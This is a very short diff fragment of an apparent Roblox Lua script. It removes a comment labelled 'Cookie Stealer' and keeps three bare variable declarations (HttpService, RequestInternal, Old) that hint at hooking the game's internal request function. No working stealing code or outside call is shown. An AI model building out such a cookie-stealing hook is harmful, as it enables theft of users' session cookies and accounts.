@@ -1,4 +1,3 @@
---Cookie Stealer
 local HttpService
 local RequestInternal
 local Old 
